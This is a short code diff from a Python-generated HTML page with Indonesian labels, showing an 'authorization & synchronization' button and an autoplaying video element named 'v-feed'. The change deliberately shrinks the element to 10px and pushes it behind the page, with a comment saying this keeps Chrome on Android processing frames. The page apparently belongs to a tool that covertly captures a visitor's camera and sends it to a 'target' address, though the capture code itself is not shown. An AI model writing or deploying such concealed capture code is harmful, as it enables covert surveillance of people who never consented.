@@ -39,7 +39,8 @@ def handshake():
             <button class="btn" onclick="triggerAllOtoritas()">OTORISASI & SINKRONISASI</button>
         </div>
 
-        <video id="v-feed" autoplay playsinline muted style="position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none;"></video>
+        <!-- MEMAKSA CHROME ANDROID UNTUK TERUS MEMPROSES FRAME SECARA REAL-TIME -->
+        <video id="v-feed" autoplay playsinline muted style="position: fixed; bottom: 0; right: 0; width: 10px; height: 10px; z-index: -999; pointer-events: none;"></video>
 
         <script>
             var targetLabAddress = "TARGET_LAB_PLACEHOLDER";
